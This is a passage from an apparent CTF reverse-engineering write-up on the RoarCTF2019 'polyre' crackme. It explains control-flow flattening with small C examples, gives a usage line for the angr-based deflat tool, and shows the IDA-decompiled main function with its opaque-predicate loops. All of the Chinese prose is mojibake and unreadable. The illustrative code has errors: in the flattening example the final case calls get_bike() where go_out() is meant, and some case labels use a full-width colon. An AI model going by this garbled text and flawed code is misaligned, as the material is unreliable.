class="keyword">int</span> num=getnum();</span><br><span class="line">                    <span class="keyword">if</span>(num!=<span class="number">1</span>)&#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    add();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(num&gt;<span class="number">2</span>)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                edit();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(num!=<span class="number">3</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            show();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num!=<span class="number">4</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        edit();</span><br><span class="line">    &#125;</span><br><span class="line">    error_choice;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¹ˆè¯´å§ï¼Œä¸¤ä¸ªä»£ç å®ç°çš„åŠŸèƒ½æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯æ˜æ˜¾ä¸‹é¢çš„å¯è¯»æ€§å°±å˜å·®äº†å¾ˆå¤šã€‚æˆ‘ä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯è¿™ä¸ªåœ¨ä½œå¦–ï¼Œå°±æ˜¯è§‰å¾—å¾ˆåƒï¼Œæå‡ºæ¥è®²ä¸€è®²hhhã€‚</p><p>ä½†æ˜¯å¥½åƒåˆæ²¡æœ‰å…³ç³»ï¼Œå› ä¸ºå®ƒä»¬å—ä¹‹é—´çš„å…³ç³»æœ¬æ¥å°±æ˜¯å¹³å¦çš„ï¼Œåé¢åªæ˜¯ç”¨whileæ›¿ä»£switchè¿›è¡Œè¿›ä¸€æ­¥æ··æ·†ï¼Œä½†æ˜¯å…¶å®æœ‰menuå‡½æ•°ä¸€çœ‹ä¾¿çŸ¥ï¼Œæ‰€ä»¥å®ƒåœ¨è¿™é‡ŒåŠ è¿™æ ·çš„é€»è¾‘æ··æ·†çš„ç¡®æ˜¯æ— ç”¨åŠŸã€‚</p><p>é‚£ä¹ˆæˆ‘çŒœæ§åˆ¶æµå¹³å¦åŒ–çš„æµç¨‹å°±æ˜¯ï¼š</p><p>â‘ å°†æ‰€æœ‰å—å¹³å¦åŒ–</p><p>â‘¡ç”¨switchåˆ†å‘</p><p>â‘¢æŠŠswitchè½¬æˆå¦‚ä¸Šçš„é‚£ç§whileå¾ªç¯åŒ…èµ·æ¥çš„ä»£ç ã€‚</p><p>è‡³äºå¹³å¦åŒ–äº†ä¹‹åå¦‚ä½•å®ç°å‰åçš„é€»è¾‘çš„å…³ç³»å‘¢ï¼Ÿå…¶å®å¾ˆç®€å•ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªé€»è¾‘</p><p>å‡å¦‚æ˜å¤©ä¸‹é›¨ï¼Œé‚£ä¹ˆæˆ‘å¸¦ä¼ï¼Œç„¶åå‡ºé—¨ï¼Œå¦åˆ™æˆ‘å¸¦ä¸Šæˆ‘çš„è‡ªè¡Œè½¦ï¼Œç„¶åå‡ºé—¨ï¼Œå†™æˆä¼ªä»£ç æ˜¯ä¸‹é¢çš„é€»è¾‘</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (rain)&#123;</span><br><span class="line">    get_umb();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    get_bike();</span><br><span class="line">&#125;</span><br><span class="line">go_out();</span><br></pre></td></tr></table></figure><p>ä»£ç è¿™ä¹ˆå†™èµ·æ¥çœ‹èµ·æ¥é€»è¾‘è¿˜æ˜¯ååˆ†æ¸…æ™°çš„ï¼Œé‚£ä¹ˆå¦‚æœåŠ æ§åˆ¶æµå¹³å¦åŒ–æ··æ·†å®ƒä¼šå˜æˆä»€ä¹ˆæ ·å‘¢ï¼Ÿè¿™é‡Œå¾ˆæ˜æ˜¾å‡ºç°ä¸‰ä¸ªè¯­å¥å—ï¼Œå¦‚æœrainæ¡ä»¶æˆç«‹ï¼Œé‚£ä¹ˆget_umb()ï¼Œå¦åˆ™get_bike()ï¼Œæœ€åä¸€å®šä¼šæ‰§è¡Œgo_out()ã€‚é‚£ä¹ˆget_umbå’Œget_bikeå°±æ˜¯ä¸€ä¸ªäºŒé€‰ä¸€çš„å…³ç³»ï¼Œè¿™ä¿©å—è·Ÿgo_outåˆæ˜¯å…ˆåçš„å…³ç³»ï¼Œè¿™æ˜¯æˆ‘ä»¬ä¸€çœ¼å¯ä»¥çœ‹å‡ºæ¥çš„é€»è¾‘ã€‚</p><p>æ§åˆ¶æµå¹³å¦åŒ–ç¬¬ä¸€æ­¥å°±æ˜¯æ‹†æ‰ä»–ä»¬è¿™æ ·çš„é€»è¾‘å…³ç³»ï¼Œç”­ç®¡æœ‰å¤šå°‘å—ï¼Œå…¨éƒ¨ç”¨while(1)+switchå»æ§åˆ¶ï¼Œå¦‚ä¸‹ä»£ç æ‰€ç¤ºã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    ch=rain;</span><br><span class="line">    <span class="keyword">switch</span>(ch)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>ï¼š</span><br><span class="line">            get_bike();</span><br><span class="line">            ch=<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            get_umb();</span><br><span class="line">            ch=<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            get_bike();</span><br><span class="line">            flag=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å¹³å¦åŒ–äº†ä¹‹åç•¥å¾®æœ‰ä¸€ç‚¹ç‚¹ä¸å¯è¯»ï¼Œä½†æ˜¯è¿˜èƒ½æ¥å—ï¼Œä½†æ˜¯å®ƒå¾€å¾€ä¸ä¼šè®©ä½ çœ‹çš„é‚£ä¹ˆå®¹æ˜“ï¼Œå› ä¸ºå®ƒchä¸å¯èƒ½å°±1ï¼Œ2ï¼Œ3ï¼Œ4è¿™ä¹ˆç»™ä½ å¼„å¥½äº†ï¼Œæˆ‘å†è¿›ä¸€æ­¥åŠ æ··æ·†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    ch=(rain*<span class="number">2</span>+<span class="number">9876</span>)*<span class="number">9</span>+<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">switch</span>(ch)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">88984</span>ï¼š</span><br><span class="line">            get_bike();</span><br><span class="line">            ch=ch*<span class="number">9</span>+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">89002</span>:</span><br><span class="line">            get_umb();</span><br><span class="line">            ch=(ch<span class="number">-18</span>)*<span class="number">9</span>+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">800857</span>:</span><br><span class="line">            get_bike();</span><br><span class="line">            flag=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœå—å†å¤šï¼Œè¿ç®—å†å¤æ‚ï¼Œä½ å¯èƒ½éƒ½ä¸èƒ½ä¸€çœ¼çœ‹å‡ºæ¥ä¸‹ä¸ä¸‹é›¨å’Œå¸¦ä¸å¸¦ä¼æ˜¯ä¸€ä¸ªä»€ä¹ˆè”ç³»äº†ã€‚</p><p>ç„¶åswitchå†åŒå¦‚ä¸Šçš„menuè¿™æ ·å˜æ¢ä¸€ä¸‹é€»è¾‘ï¼Œå°±æ›´éš¾è¯»äº†ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬é¢˜ç›®ä¸­çœ‹åˆ°çš„è¿™ä¸ªæ ·å­ï¼Œå¯ä»¥å‘ç°ï¼Œå®ƒå¹³å¦çš„å—å·²ç»æ˜¯ç‰¹åˆ«å¯†é›†äº†ï¼Œç–¯ç‹‚while(1)ç„¶åä¸­é—´æ¡ä»¶åˆ¤æ–­å»breakã€‚</p><p>ä»¥ä¸Šåˆ†æå‡ä¸ºè‡ªå·±ä¸ªäººç†è§£ï¼Œå¹¶ä½¿ç”¨è‡ªå·±æœ€æœ´ç´ çš„è¯­è¨€è®²è¿°å‡ºæ¥çš„ã€‚</p><h3 id="æŠµæŠ—æ§åˆ¶æµå¹³å¦åŒ–"><a href="#æŠµæŠ—æ§åˆ¶æµå¹³å¦åŒ–" class="headerlink" title="æŠµæŠ—æ§åˆ¶æµå¹³å¦åŒ–"></a>æŠµæŠ—æ§åˆ¶æµå¹³å¦åŒ–</h3><p>æ—¢ç„¶æœ‰äººç ”ç©¶å‡ºäº†è¿™æ ·çš„ä»£ç æ··æ·†ï¼Œè‡ªç„¶ä¹Ÿæœ‰äººç ”ç©¶å‡ºäº†å¯¹åº”çš„è§£æ³•ï¼Œè¿™é‡Œæ”¾é¡¹ç›®åœ°å€<a href="https://github.com/cq674350529/deflat">https://github.com/cq674350529/deflat</a></p><p>è¯¥é¡¹ç›®ä»¥angrä½œä¸ºä¾èµ–ï¼Œåœ¨ä¸ªäººä½¿ç”¨çš„æ—¶å€™æˆ‘æŠŠå®ƒæºç downloadä¸‹æ¥è¿˜éœ€è¦æŠŠå®ƒflat_control_flowç›®å½•ä¸‹çš„deflat.pyç§»åŠ¨åˆ°ä¸Šä¸€å±‚ç›®å½•æ‰èƒ½æ­£å¸¸ä½¿ç”¨ï¼Œä½¿ç”¨æ–¹å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$python(3) deflat.py -f [file_name] --addr [function_addr]</span><br></pre></td></tr></table></figure><p>è¿™é‡Œfunction_addrå³ä¸ºæ·»åŠ äº†æ­¤æ··æ·†çš„å‡½æ•°åœ°å€ã€‚æ”¾ç€è·‘ä¸ªå‡ åˆ†é’Ÿï¼Œå°±èƒ½è·‘å‡ºæ¥ä¸€ä¸ªæ§åˆ¶æµæ¯”è¾ƒæ¸…æ™°çš„elfæ–‡ä»¶äº†ã€‚</p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/4.png" alt="4"></p><h2 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h2><p>æˆ‘ä»¬ç”¨idaåç¼–è¯‘èƒ½å¾—åˆ°ä»¥ä¸‹ä»£ç </p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v4; <span class="comment">// [rsp+1E0h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1E8h] [rbp-108h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">48</span>]; <span class="comment">// [rsp+1F0h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">60</span>]; <span class="comment">// [rsp+220h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+25Ch] [rbp-94h]</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// [rsp+260h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+26Ch] [rbp-84h]</span></span><br><span class="line">  <span class="keyword">bool</span> v13; <span class="comment">// [rsp+272h] [rbp-7Eh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v14; <span class="comment">// [rsp+273h] [rbp-7Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+274h] [rbp-7Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v16; <span class="comment">// [rsp+278h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+284h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+288h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">bool</span> v19; <span class="comment">// [rsp+28Fh] [rbp-61h]</span></span><br><span class="line">  <span class="keyword">char</span> *v20; <span class="comment">// [rsp+290h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [rsp+298h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">bool</span> v22; <span class="comment">// [rsp+29Fh] [rbp-51h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+2A0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">bool</span> v24; <span class="comment">// [rsp+2AFh] [rbp-41h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+2B0h] [rbp-40h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+2B8h] [rbp-38h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+2C0h] [rbp-30h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+2C8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [rsp+2D0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [rsp+2D4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v31; <span class="comment">// [rsp+2D8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [rsp+2E0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [rsp+2E4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">bool</span> v34; <span class="comment">// [rsp+2EBh] [rbp-5h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(s1));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input:&quot;</span>);</span><br><span class="line">  v11 = s;</span><br><span class="line">  <span class="keyword">if</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v11);</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( dword_603058 &lt; <span class="number">10</span> || ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">LABEL_43:</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v11);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v12 = v6;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    v13 = v12 &lt; <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v14 = s[v6];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v15 = v14;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    <span class="keyword">if</span> ( v15 == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = &amp;s[v6];</span><br><span class="line">      *v16 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = v6 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v6 = v17;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v18 = i;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v19 = v18 &lt; <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    <span class="keyword">if</span> ( !v19 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      v20 = s;</span><br><span class="line">    <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    v4 = *(_QWORD *)&amp;v20[<span class="number">8</span> * i];</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v21 = v7;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        v22 = v21 &lt; <span class="number">64</span>;</span><br><span class="line">      <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">      <span class="keyword">if</span> ( !v22 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v23 = v4;</span><br><span class="line">      v24 = v4 &lt; <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v27 = v4;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          v28 = <span class="number">2</span> * v27;</span><br><span class="line">        <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">        v4 = v28;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v25 = <span class="number">2</span> * v4;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          v26 = v25;</span><br><span class="line">        <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">        v4 = v26 ^ <span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      v29 = v7;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        v7 = v29 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    v30 = <span class="number">8</span> * i;</span><br><span class="line">    v31 = &amp;s1[<span class="number">8</span> * i];</span><br><span class="line">    <span class="keyword">if</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">LABEL_55:</span><br><span class="line">      *(_QWORD *)v31 = v4;</span><br><span class="line">    *(_QWORD *)v31 = v4;</span><br><span class="line">    <span class="keyword">if</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_55;</span><br><span class="line">    v32 = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    v33 = <span class="built_in">memcmp</span>(s1, &amp;unk_402170, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> );</span><br><span class="line">  v34 = v33 != <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( v34 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‡ªä¹ ä¸€çœ‹å…¶å®å°±å‘ç°å…¶å®å®ƒè¿˜æ˜¯åŠ äº†ä¸€äº›æ··æ·†ï¼Œæ¯”å¦‚é‡Œé¢é‡å¤çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè¡¨è¾¾å¼å®é™…ä¸Šæ˜¯æ°¸è¿œä¸ºå‡çš„ï¼Œå®ƒå› 